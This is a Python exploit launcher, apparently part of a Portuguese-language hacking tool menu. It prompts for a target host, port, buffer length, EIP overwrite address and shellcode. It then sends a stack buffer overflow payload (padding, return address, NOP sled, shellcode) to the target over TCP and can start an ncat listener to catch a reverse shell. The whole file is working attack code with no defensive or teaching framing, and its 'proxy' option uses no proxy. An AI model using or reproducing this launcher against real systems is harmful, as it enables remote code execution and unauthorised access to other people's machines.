import socket
from subprocess import run
from Zerasus import menu
from colores import *

try:
    select_option()
    select_proxymain()
    option = int(input('-> '))

    def no_proxy():
        clear()
        print(f"{color.RED}Consulte README.txt para saber o modo de uso!{color.END}")

        select_host()
        ip = input(f"->")
        clear()

        select_port()
        porta = int(input("-> "))
        clear()

        info_bytes()
        buf = int(input("-> "))
        clear()

        info_EIP()
        eip = input("-> ").lower()
        clear()

        info_shellcode()
        shellcode = input("-> ")
        clear()

        info_msg()
        msg = input("-> ")
        clear()

        rev = input(
            f"{color.GREEN}Se for reverse shell informe a porta para conexao: \r\nSe não for ignore.{color.END}")
        clear()

        eip = bytes.fromhex(eip.replace('\\x', ''))
        shellcode = bytes.fromhex(shellcode.replace('\\x', ''))

        dados = "A" * buf
        nulo = "\x90" * 40
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, porta))
        s.recv(1024)

        if rev == '':
            s.send(bytes(f"{msg} {dados}".encode('utf-8') + eip + nulo.encode('iso-8859-1') + shellcode))
        else:
            s.send(bytes(f"{msg} {dados}".encode('utf-8') + eip + nulo.encode('iso-8859-1') + shellcode))
            run(f"ncat -vnlp {rev}", shell=True)
        sleep(4)
        menu()


    def proxyes():
        print(f"{color.RED}Consulte README.txt para saber o modo de uso!{color.END}")

        select_host()
        ip = input(f"->")

        select_port()
        porta = int(input("-> "))

        info_bytes()
        buf = int(input("-> "))

        info_EIP()
        eip = input("-> ")

        info_shellcode()
        shellcode = input("-> ")

        info_msg()
        msg = input("-> ")

        rev = input(
            f"{color.GREEN}Se for reverse shell informe a porta para conexao: \r\nSe não for ignore.{color.END}")
        clear()
        eip = bytes.fromhex(eip.replace('\\x', ''))
        shellcode = bytes.fromhex(shellcode.replace('\\x', ''))

        dados = "A" * buf
        nulo = "\x90" * 40
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, porta))
        s.recv(1024)

        if rev == '':
            s.send(bytes(f"{msg} {dados}".encode('utf-8') + eip + nulo.encode('iso-8859-1') + shellcode))
        else:
            s.send(bytes(f"{msg} {dados}".encode('utf-8') + eip + nulo.encode('iso-8859-1') + shellcode))
            run(f"ncat -vnlp {rev}", shell=True)
        sleep(4)
        menu()


    if option == 1:
        no_proxy()
    elif option == 2:
        proxyes()
    else:
        print(f"{color.RED}Na proxima informe uma opcao!", sleep(3))
        print(f"De volta para o menu!{color.END}", sleep(2))
        menu()

except Exception:
    print(f"{color.RED}[ ! ] Ocorreu um erro: {Exception}[ ! ]\nDe volta para o Menu!")
    sleep(4)
    menu()
